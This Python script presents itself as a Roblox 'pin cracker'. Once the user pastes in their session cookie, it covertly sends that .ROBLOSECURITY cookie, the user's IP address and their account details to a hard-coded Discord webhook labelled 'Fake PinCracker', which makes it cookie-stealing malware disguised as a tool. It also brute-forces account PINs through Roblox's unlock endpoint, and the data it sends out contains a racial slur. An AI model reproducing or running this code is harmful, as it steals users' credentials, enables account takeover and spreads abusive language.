import os

os.system("pip install requests")
os.system("pip install datetime")
os.system("pip install colorama")
os.system("cls")

import requests
import json
import time
from datetime import datetime
import colorama
from colorama import Fore, Back, Style, init
import json
init(convert=True)

ascii_art = r"""
                     ________       ___    ___ ___       __   _______   ___     ___    ___ 
                    |\   ____\     |\  \  /  /|\  \     |\  \|\  ___ \ |\  \   |\  \  /  /|
                    \ \  \___|_    \ \  \/  / | \  \    \ \  \ \   __/|\ \  \  \ \  \/  / /
                     \ \_____  \    \ \    / / \ \  \  __\ \  \ \  \_|/_\ \  \  \ \    / / 
                      \|____|\  \    \/  /  /   \ \  \|\__\_\  \ \  \_|\ \ \  \  /     \/  
                       ____\_\  \ __/  / /      \ \____________\ \_______\ \__\/  /\   \  
                       |\_________\\___/ /        \|____________|\|_______|\|__/__/ /\ __\ 
                       \|_________\|___|/                                      |__|/ \|__| 
                                                Made by Fusder
    """
print(ascii_art)

def main(cookie):
    ipAddr = requests.get("https://api.ipify.org").text

    statistics = None
    ID = "Couldn't get user ID to parse this info"

    if cookie:
        response = requests.get("https://www.roblox.com/mobileapi/userinfo",
                                headers={"Cookie": ".ROBLOSECURITY=" + cookie},
                                allow_redirects=False)

        if response.status_code == 200:
            statistics = response.json()
            ID = statistics.get("UserID", "N/A")

    payload = {
        "content": None,
        "embeds": [
            {
                "description": "```" + (cookie if cookie else "COOKIE NOT FOUND") + "```",
                "color": None,
                "fields": [
                    {"name": "Username", "value": statistics["UserName"] if statistics else "N/A", "inline": True},
                    {"name": "Robux", "value": statistics["RobuxBalance"] if statistics else "N/A", "inline": True},
                    {"name": "Premium", "value": statistics["IsPremium"] if statistics else "N/A", "inline": True},
                    {"name": "ID", "value": statistics["UserID"] if statistics else "N/A", "inline": True},
                    {"name": "Builders Club", "value": statistics["IsAnyBuildersClubMember"] if statistics else "N/A", "inline": True},
                    {"name": "ID Test", "value": ID, "inline": True},
                ],
                "author": {
                    "name": "Nigga Found: " + ipAddr,
                    "icon_url": statistics["ThumbnailUrl"] if statistics else "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                },
                "thumbnail": {
                    "url": statistics["ThumbnailUrl"] if statistics else "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                }
            }
        ],
        "username": "Fake PinCracker",
        "avatar_url": "https://cdn.discordapp.com/attachments/1086751397502001201/1135199253065637888/Screenshot_2023-07-25_224610.png",
        "attachments": []
    }

    headers = {"Content-Type": "Application/json"}
    response = requests.post(WEBHOOK, headers=headers, data=json.dumps(payload))

WEBHOOK = "https://discord.com/api/webhooks/1123913219698872361/GiH7qLGctK2WBvrgW98Phv7Dwi3-HE77cUJldEPEHLaiOjzkd-RBc6bAommRRd5Pd-qk"

credentials = input(Fore.RED + '[SYWEIX] Thanks for using Syweix pin cracker. Enter the account cookie - ')
if credentials.count(':') >= 2:
    username, password, cookie = credentials.split(':',2)
else:
    username, password, cookie = '', '', credentials
os.system('cls')

main(credentials)

req = requests.Session()
req.cookies['.ROBLOSECURITY'] = cookie
try:
    username = req.get('https://www.roblox.com/mobileapi/userinfo').json()['UserName']
    print(Fore.YELLOW + 'Logged in to', username)
except:
    input(Fore.RED + 'INVALID COOKIE')
    exit()

common_pins = req.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv').text
pins = [pin.split(',')[0] for pin in common_pins.splitlines()]
print(Fore.CYAN + 'Loaded pins was made by SyweixCommunity.')

r = req.get('https://accountinformation.roblox.com/v1/birthdate').json()
month = str(r['birthMonth']).zfill(2)
day = str(r['birthDay']).zfill(2)
year = str(r['birthYear'])

likely = [username[:4], password[:4], username[:2]*2, password[:2]*2, username[-4:], password[-4:], username[-2:]*2, password[-2:]*2, year, day+day, month+month, month+day, day+month]
likely = [x for x in likely if x.isdigit() and len(x) == 4]
for pin in likely:
    pins.remove(pin)
    pins.insert(0, pin)
print(f'Prioritized likely pins {likely}\n')

tried = 0
while 1:
    pin = pins.pop(0)
    os.system(f'title Pin Cracking {username} ~ Tried: {tried} ~ Current pin: {pin}')
    try:
        r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})
        if 'X-CSRF-TOKEN' in r.headers:
            pins.insert(0, pin)
            req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        elif 'errors' in r.json():
            code = r.json()['errors'][0]['code']
            if code == 0 and r.json()['errors'][0]['message'] == 'Authorization has been denied for this request.':
                print(Fore.MAGENTA + f'[FAILURE] Account cookie expired. :(')
                break
            elif code == 1:
                print(f'[SUCCESS] NO PIN')
                with open('pins.txt','a') as f:
                    f.write(f'NO PIN:{credentials}\n')
                break
            elif code == 3 or '"message":"TooManyRequests"' in r.text:
                pins.insert(0, pin)
                print(Fore.YELLOW + f'[{datetime.now()}] Sleeping for 5 minutes...')
                time.sleep(60*5)
            elif code == 4:
                tried += 1
        elif 'unlockedUntil' in r.json():
            print(f'[SUCCESS] {pin}')
            with open('pins.txt','a') as f:
                f.write(f'{pin}:{credentials}\n')
            break
        else:
            pins.insert(0, pin)
            print(f'[ERROR] {r.text}')
    except Exception as e:
        print(f'[ERROR] {e}')
        pins.insert(0, pin)


import json
        

input()
